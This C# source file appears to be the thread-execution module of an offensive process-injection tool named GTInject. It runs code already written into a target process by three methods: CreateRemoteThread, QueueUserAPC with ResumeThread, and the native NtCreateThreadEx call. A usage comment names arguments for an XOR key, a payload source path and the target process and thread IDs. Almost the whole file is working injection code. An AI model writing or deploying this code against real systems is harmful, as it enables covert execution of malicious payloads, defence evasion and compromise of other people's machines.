using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

namespace GTInject.Injection
{
    internal class threadexec
    {
        public static IntPtr SelectThreadOption(IntPtr memaddr, int execoption, Process pid, int tid)
        {
            switch (execoption)
            {
                case 100:
                    return execopt100(memaddr, pid, tid);
                case 101:
                    return execopt101(memaddr, pid, tid);
                case 200:
                    return execopt200(memaddr, pid, tid);
                case 4:
                    return IntPtr.Zero;
            }
            return IntPtr.Zero;
        }

        private static IntPtr execopt100(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 100 == CreateRemoteThread (WINAPI)
            /////////////////////////////////////
            
            IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
            Console.WriteLine( " called CreateRemoteThread at : " + remoteThreadResp);
            return remoteThreadResp;
        }

        private static IntPtr execopt101(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 101 == QueueUserAPC & ResumeThread (WINAPI)
            /////////////////////////////////////
            Console.WriteLine( " Thread exec with WINAPI Q User APC and Resume Thread");
            //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
            var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            Console.WriteLine(  " Returned OpenThread " + threadHandle);

            var QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero);

            if (QuApcResp == 0) // if succeeds, return value is non-zero
            {
                Console.WriteLine(" [-] Failed QueueUserAPC WINAPI execution");
                return IntPtr.Zero;
            }
            else
            {
                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                    {
                        Console.WriteLine(" thread is suspended, so calling resume Thread WINAPI on this");
                        var ResThreadResp = ResumeThread(threadHandle);
                        if (ResThreadResp == -1)
                        {
                            Console.WriteLine("resume Thread failed");
                            return IntPtr.Zero;
                        }
                    }
                }
                return threadHandle; // returning an IntPtr, threadhandle is already an IntPtr
            }
            
            //If thread state is Suspended, must resume, If Execution Delay, will trigger automatically, no API call needed, don't recall thread in Wait state action

        }

        private static IntPtr execopt200(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 200 == NtCreateThreadEx (NTAPI)
            /////////////////////////////////////
            ///
            //Create a remote thread and execute it.
            //IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            return hRemoteThread;
        }

        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////


        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////
        [Flags]
        public enum    ThreadAccess : int
        {
            TERMINATE           = (0x0001)  ,
            SUSPEND_RESUME      = (0x0002)  ,
            GET_CONTEXT         = (0x0008)  ,
            SET_CONTEXT         = (0x0010)  ,
            SET_INFORMATION     = (0x0020)  ,
            QUERY_INFORMATION       = (0x0040)  ,
            SET_THREAD_TOKEN    = (0x0080)  ,
            IMPERSONATE         = (0x0100)  ,
            DIRECT_IMPERSONATION    = (0x0200)
        }
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern int ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);


    }
}
